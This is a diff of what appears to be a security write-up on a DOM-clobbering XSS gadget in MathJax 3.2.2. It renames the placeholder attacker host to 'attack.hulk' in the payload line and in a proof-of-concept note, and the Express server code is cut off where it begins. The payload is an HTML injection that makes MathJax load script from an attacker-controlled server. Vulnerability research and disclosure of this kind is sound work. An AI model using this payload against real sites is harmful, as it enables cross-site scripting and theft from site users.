@@ -6,7 +6,7 @@
 + Stars: 10.1K
 + Version: v3.2.2
 + Fingerprint: `MathJax.version == "3.2.2"`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$```
++ Payload: ```<img name="currentScript" src="https://attack.hulk"></img> $$\require{tex}$$```
 + Impact: XSS
 + CVE: N/A
 + Status: Accepted
@@ -42,7 +42,7 @@ prefix: function(t) {
 
 Note that some MathJax instances may be configured differently. If the image loads before MathJax is started, then `MathJax.config.loader.paths.mathjax` should be clobbered. Then, check `MathJax.config.loader.paths` or `MathJax.config.loader.source` to see what dependencies can be loaded in.
 
-Please note that for the following proof of concept, you will need to replace `xxx.xxx.xxx` with your own server address.
+Please note that for the following proof of concept, you will need to replace `attack.hulk` with your own server address.
 ```
 const express = require('express');
 const path = require('path');
